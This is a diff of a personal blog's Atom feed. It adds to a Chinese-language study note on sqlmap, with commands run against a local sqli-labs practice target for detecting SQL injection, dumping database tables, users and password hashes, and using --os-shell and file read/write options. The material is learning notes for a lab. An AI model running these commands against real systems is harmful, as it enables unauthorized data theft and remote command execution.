@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zyyiszyy.github.io</id>
     <title>zyyire</title>
-    <updated>2021-03-15T14:34:00.379Z</updated>
+    <updated>2021-03-15T15:23:26.348Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zyyiszyy.github.io"/>
     <link rel="self" href="https://zyyiszyy.github.io/atom.xml"/>
@@ -16,13 +16,68 @@
         <link href="https://zyyiszyy.github.io/post/sqlmap-shi-yong-fang-fa-he-chang-yong-ming-ling/">
         </link>
         <updated>2021-03-15T14:18:45.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="sqlmap入门">sqlmap入门</h1>
+        <content type="html"><![CDATA[<p>SQLMap是个自动化的SQL注入工具，主要功能扫描、发现并利用给定URL的SQL注入漏洞，功能强大，特查阅书本作此简记，方便今后查询。</p>
+<h1 id="sqlmap入门">sqlmap入门</h1>
 <h3 id="判断是否存在sql注入">判断是否存在sql注入</h3>
 <p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code><br>
-注意：多个参数时url加“”<br>
+注：多个参数时url加“”。<br>
 <img src="https://zyyiszyy.github.io/post-images/1615818542642.png" alt="" loading="lazy"></p>
 <h3 id="判断文本中请求是否存在注入">判断文本中请求是否存在注入</h3>
-<p><code>sqlmap.py -r desktop/1.txt</code></p>
+<p><code>sqlmap.py -r desktop/1.txt</code><br>
+WEB数据包文件中加载HTTP请求，这样一般不设置其他参数。</p>
+<h3 id="查询当前用户下所有数据库">查询当前用户下所有数据库</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --dbs</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615819127081.png" alt="" loading="lazy"></p>
+<h3 id="获取数据库的表名">获取数据库的表名</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables</code><br>
+注：-D是指定库名，不指定可以省略。<br>
+<img src="https://zyyiszyy.github.io/post-images/1615819287665.png" alt="" loading="lazy"></p>
+<h3 id="获取表中字段名">获取表中字段名</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615819377555.png" alt="" loading="lazy"></p>
+<h3 id="获取字段内容">获取字段内容</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users -C id,username,password --dump</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615819498044.png" alt="" loading="lazy"></p>
+<h3 id="获取数据库所有用户">获取数据库所有用户</h3>
+<p>在当前用户有权读取包含所有用户的表的权限时，使用该命令可以列出所有管理用户。<br>
+<code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --users</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615819597242.png" alt="" loading="lazy"></p>
+<h3 id="获取数据库用户的密码">获取数据库用户的密码</h3>
+<p>在当前用户有读取包含用户密码的权限，使用该命令可以列出用户和hash值。<br>
+<code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --passwords</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615819906690.png" alt="" loading="lazy"></p>
+<h3 id="获取当前网站数据库的名称">获取当前网站数据库的名称</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --current-db</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615820000712.png" alt="" loading="lazy"></p>
+<h3 id="获取当前网站数据库的用户名称">获取当前网站数据库的用户名称</h3>
+<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --current-user</code><br>
+<img src="https://zyyiszyy.github.io/post-images/1615820071721.png" alt="" loading="lazy"><br>
+#sqlmap进阶</p>
+<h3 id="探测等级">探测等级</h3>
+<p>一共五个测试等级，默认是1，等级越高速度越慢。HTTP cookie在level为2时就会测试；HTTP User-Agent/Referer头在level为3时就会测试；当level为5时，自动破解cookie，XFF等头部注入。总之，不确定哪个Payload或参数为注入点时，为保证全面性，建议用高的level值。<br>
+<code>--level 5</code></p>
+<h3 id="当前用户是否为管理员权限">当前用户是否为管理员权限</h3>
+<p><code>--is-dba</code></p>
+<h3 id="列出数据库管理员角色">列出数据库管理员角色</h3>
+<p>仅适用当前数据库为Oracle的时候，当前用户有权读取包含所有用户的表，用该命令可列举每个用户的角色，也可以用-U指定想看哪个用户的角色。<br>
+<code>--roles</code></p>
+<h3 id="http-referer头">HTTP Referer头</h3>
+<p>sqlmap可以在请求中伪造HTTP中的referer，当level不小于3，会尝试对referer注入。可以用referer命令来欺骗。<br>
+<code>--referer</code></p>
+<h3 id="运行自定会sql语句">运行自定会sql语句</h3>
+<p><code>--sql-shell</code></p>
+<h3 id="运行任意操作系统命令">运行任意操作系统命令</h3>
+<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，如果数据库上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()，那么创建的这两个函数就可以执行系统命令。<br>
+<code>--os-cmd,--os-shell</code></p>
+<h3 id="从数据库服务器中读取文件">从数据库服务器中读取文件</h3>
+<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。<br>
+<code>--file-read</code></p>
+<h3 id="上传文件到数据库服务器中">上传文件到数据库服务器中</h3>
+<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。<br>
+<code>--file-write --file-dest</code></p>
+<blockquote>
+<p>SQLMap还自带绕过脚本tamper，其功能和上面介绍的部分进阶功能用之甚少，随着以后学习再做扩充。</p>
+</blockquote>
 ]]></content>
     </entry>
     <entry>
